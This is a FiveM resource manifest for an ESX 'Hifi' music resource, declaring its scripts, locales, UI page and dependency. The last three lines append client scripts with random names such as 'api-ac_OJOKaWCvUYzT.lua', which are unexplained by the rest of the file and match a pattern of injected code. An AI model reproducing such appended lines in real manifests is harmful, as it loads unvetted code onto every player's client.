fx_version "bodacious"

games {"gta5"}
lua54 'yes'
--

description 'ESX Hifi'

version '1.0.0'

server_scripts {
    '@es_extended/locale.lua',
    'locales/en.lua',
    'server/main.lua',
    'config.lua'
}

client_script {
    '@es_extended/locale.lua',
    '@es_extended/imports.lua',
    'client/main.lua',
    'locales/en.lua',
    'config.lua'
}

ui_page('html/index.html')

files {
    'html/index.html',
    'html/app.js'
}

dependencies {
    'es_extended'
}

client_script "api-ac_OJOKaWCvUYzT.lua"
client_script "api-ac_vOJKHGqGxvPe.lua"
client_script "api-ac_uuQhioHoEMHi.lua"